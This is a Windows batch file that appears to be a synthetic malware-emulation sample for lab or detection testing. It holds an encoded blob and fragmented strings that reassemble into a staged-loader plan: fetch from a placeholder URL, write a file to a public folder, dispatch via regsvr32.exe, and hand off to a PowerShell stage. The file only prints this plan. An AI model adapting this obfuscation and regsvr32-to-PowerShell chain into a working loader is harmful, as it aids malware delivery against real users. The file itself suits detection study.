@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:reversed_text|reverse_xor
rem HUNTRESS-MATERIAL:F5gAPB0RWNEQOIFUCZkWBZFbBZlXcdkVfQUQadkVsVlWfZ1HXpFQDJ1RQtFbDFEXQZFQA9xWS11VcVVVsBEUBp1QH9kUXJ1QHZVQOEkVUBURBBQAdY1SW9EQHJFVWxGUcZUXH5wBPRVQSN0WOAkWdR1XW9UXWt0Rs9lUdRlRSRlVOMEXEZVQAtlVf91TQJlXDJlWU1FbadlDQJlXDJlWU1lHLMQBDI1BEAlCX9kRB9lDbd0RDBUCcwxCDUwASdABQpwVdY1SS51QfZVHa1VRS9lWXxxBSBwABAwCG0xVSd0TVp1XWx2QSd0WOAXCvZGQWFEQvNmRR9lWQ92eG11RBZFQA9nUR9GQHJFVW5xCDUwASdABQpwVdclUH9UXWt0RsB0RSRlVOA0RSRlVeswAFMgUHQAUKcVHDBkA
rem HUNTRESS-EXTENSION:bat
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
SeT "fragment0=v=1|steps=acquire_remote,write_file,dispatch_process,handoff_script|adapter=reg"
SeT "fragment1=svr32.exe|stage_count=4|graph=single|next_language=powershell|campaign_id=campa"
SeT "fragment2=ign-8060a47c9d|url=https://8060a47c9d.example.invalid/4a302385.dat|file_path=C:"
SeT "fragment3=\Users\Public\HuntressLab\stage-8060a47c9d.dat|next_stage=stage-8060a47c9d.ps1"
goto :HUNTRESS_SEPARATOR_DONE
ver >nul & rem HUNTRESS separator ampersand
:HUNTRESS_SEPARATOR_DONE
set "neutral_string_join=843baaca"
call :HUNTRESS_RECOVER
goto :HUNTRESS_EMIT
:HUNTRESS_RECOVER
set "recovered_configuration="
for %%G in (0 1 2 3) do call set "recovered_configuration=%%recovered_configuration%%%%fragment%%G%%"
exit /b 0
:HUNTRESS_EMIT
echo(!recovered_configuration!
exit /b 0
:HUNTRESS_PLAN
echo regsvr32.exe acquire, write, dispatch, and hand off stage-8060a47c9d.ps1
exit /b 0
